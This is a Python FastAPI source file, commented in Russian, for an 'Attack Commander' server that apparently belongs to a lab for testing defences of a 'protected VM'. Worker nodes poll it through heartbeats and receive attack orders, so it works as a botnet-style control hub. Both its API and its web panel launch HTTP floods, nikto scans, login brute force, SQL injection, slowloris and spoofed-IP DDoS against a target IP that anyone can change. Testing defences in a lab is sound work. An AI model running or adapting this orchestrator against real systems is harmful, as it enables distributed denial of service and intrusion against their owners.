"""
COMMANDER — главная атакующая нода.
Запускается на atk-1, имеет REST API.
Рабочие ноды (workers) сами подключаются к ней и получают команды.

API:
  GET  /status         — статус всех нод + текущая атака
  POST /attack/start   — запустить атаку на всех
  POST /attack/stop    — остановить
  GET  /workers        — список подключённых нод
  POST /attack/single  — атака только с командера
"""

import os
import time
import asyncio
import threading
import subprocess
import logging
from fastapi import FastAPI
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
import uvicorn

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s")
logger = logging.getLogger("commander")

TARGET = os.getenv("TARGET_IP", "10.0.0.1")   # IP защищаемой ВМ
PORT   = int(os.getenv("CMD_PORT", 5000))

app = FastAPI(title="Attack Commander")

# ─── Глобальное состояние ────────────────────────────────────────────────────
state = {
    "current_attack": None,
    "workers":        {},     # worker_id → {ip, last_seen, attack}
    "attack_active":  False,
    "target":         TARGET,
}

current_proc = None   # subprocess атаки командера


# ─── Модели ──────────────────────────────────────────────────────────────────
class AttackCmd(BaseModel):
    attack_type: str      # flood|ddos|scan|brute|sqli|slowloris|flash|slow
    target:      str = "" # если пусто — берём из state
    duration:    int = 60 # секунды


class WorkerHeartbeat(BaseModel):
    worker_id: str
    ip:        str
    status:    str = "idle"


# ─── Атаки командера ─────────────────────────────────────────────────────────
ATTACKS = {
    "flood":     lambda t: ["ab", "-n", "100000", "-c", "300", "-q", f"http://{t}/"],
    "scan":      lambda t: ["nikto", "-h", f"http://{t}", "-maxtime", "120s", "-quiet"],
    "brute":     lambda t: ["python3", "/app/attacks/brute.py", t],
    "sqli":      lambda t: ["python3", "/app/attacks/sqli.py", t],
    "slowloris": lambda t: ["python3", "/app/attacks/slowloris.py", t],
    "flash":     lambda t: ["wrk", "-t4", "-c50", "-d60s", f"http://{t}/"],
    "slow":      lambda t: ["wrk", "-t2", "-c20", "-d60s", f"http://{t}/search"],
    "ddos":      lambda t: ["python3", "/app/attacks/ddos_spoof.py", t],
}


def run_local_attack(attack_type: str, target: str):
    global current_proc
    if current_proc and current_proc.poll() is None:
        current_proc.terminate()

    cmd = ATTACKS.get(attack_type, ATTACKS["flood"])(target)
    logger.info(f"[commander] Запускаю: {' '.join(cmd)}")
    try:
        current_proc = subprocess.Popen(cmd)
    except FileNotFoundError as e:
        logger.error(f"Команда не найдена: {e}")


def stop_local_attack():
    global current_proc
    if current_proc and current_proc.poll() is None:
        current_proc.terminate()
        current_proc = None
        logger.info("[commander] Атака остановлена")


# ─── API ─────────────────────────────────────────────────────────────────────
@app.get("/status")
def status():
    now = time.time()
    alive_workers = {
        wid: info for wid, info in state["workers"].items()
        if now - info["last_seen"] < 15
    }
    return {
        "target":         state["target"],
        "attack_active":  state["attack_active"],
        "current_attack": state["current_attack"],
        "workers_online": len(alive_workers),
        "workers":        alive_workers,
    }


@app.get("/workers")
def workers():
    now = time.time()
    return {
        wid: {**info, "alive": (now - info["last_seen"]) < 15}
        for wid, info in state["workers"].items()
    }


@app.post("/attack/start")
def start_attack(cmd: AttackCmd):
    target = cmd.target or state["target"]
    state["current_attack"] = cmd.attack_type
    state["attack_active"]  = True
    state["target"]         = target

    # Запустить атаку локально на командере
    run_local_attack(cmd.attack_type, target)

    logger.info(f"[commander] Атака {cmd.attack_type} → {target} | "
                f"воркеров: {len(state['workers'])}")
    return {
        "status": "started",
        "attack": cmd.attack_type,
        "target": target,
        "workers_notified": len(state["workers"]),
    }


@app.post("/attack/stop")
def stop_attack():
    state["attack_active"]  = False
    state["current_attack"] = None
    stop_local_attack()
    return {"status": "stopped"}


@app.post("/worker/heartbeat")
def worker_heartbeat(hb: WorkerHeartbeat):
    """Воркеры сами регистрируются и получают текущую команду."""
    state["workers"][hb.worker_id] = {
        "ip":        hb.ip,
        "last_seen": time.time(),
        "status":    hb.status,
    }
    # Вернуть текущую команду воркеру
    return {
        "attack_active":  state["attack_active"],
        "current_attack": state["current_attack"],
        "target":         state["target"],
    }


@app.get("/target")
def get_target():
    return {"target": state["target"]}


@app.post("/target")
def set_target(body: dict):
    state["target"] = body.get("target", state["target"])
    return {"target": state["target"]}


# ─── Веб-интерфейс (простой) ──────────────────────────────────────────────────
@app.get("/ui", response_class=HTMLResponse)
def ui():
    return """<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<title>Attack Commander</title>
<style>
  body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
  h1 { color: #f00; }
  button { background: #333; color: #0f0; border: 1px solid #0f0;
           padding: 8px 18px; margin: 4px; cursor: pointer; font-size: 14px; }
  button:hover { background: #0f0; color: #000; }
  button.stop { border-color: #f00; color: #f00; }
  button.stop:hover { background: #f00; color: #000; }
  input { background: #222; color: #0f0; border: 1px solid #0f0;
          padding: 6px; font-size: 14px; width: 200px; }
  #status { margin-top: 20px; white-space: pre; font-size: 13px; }
  .section { margin: 16px 0; border-left: 3px solid #0f0; padding-left: 12px; }
</style>
</head>
<body>
<h1>⚔  ATTACK COMMANDER</h1>

<div class="section">
  <b>Цель:</b>
  <input id="target" value="" placeholder="IP защищаемой ВМ" />
  <button onclick="setTarget()">Установить</button>
</div>

<div class="section">
  <b>Запустить атаку:</b><br><br>
  <button onclick="attack('flood')">🌊 HTTP Flood</button>
  <button onclick="attack('ddos')">💥 DDoS (500 IP)</button>
  <button onclick="attack('scan')">🔍 Сканирование (nikto)</button>
  <button onclick="attack('brute')">🔑 Brute Force /login</button>
  <button onclick="attack('sqli')">💉 SQL Injection</button>
  <button onclick="attack('slowloris')">🐢 Slowloris</button>
  <button onclick="attack('flash')">⚡ Flash Crowd (легитим)</button>
  <button onclick="attack('slow')">🌙 Медленный флуд</button>
  <br><br>
  <button class="stop" onclick="stop()">⛔ СТОП — все атаки</button>
</div>

<div class="section">
  <b>Статус (обновляется каждые 3 сек):</b>
  <div id="status">загрузка...</div>
</div>

<script>
const BASE = window.location.origin;

async function attack(type) {
  const target = document.getElementById('target').value;
  const r = await fetch(BASE + '/attack/start', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({attack_type: type, target: target})
  });
  const d = await r.json();
  console.log(d);
}

async function stop() {
  await fetch(BASE + '/attack/stop', {method:'POST'});
}

async function setTarget() {
  const t = document.getElementById('target').value;
  await fetch(BASE + '/target', {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({target: t})
  });
}

async function refresh() {
  const r = await fetch(BASE + '/status');
  const d = await r.json();
  document.getElementById('target').placeholder = d.target;
  document.getElementById('status').textContent = JSON.stringify(d, null, 2);
}

setInterval(refresh, 3000);
refresh();
</script>
</body>
</html>"""


if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="warning")
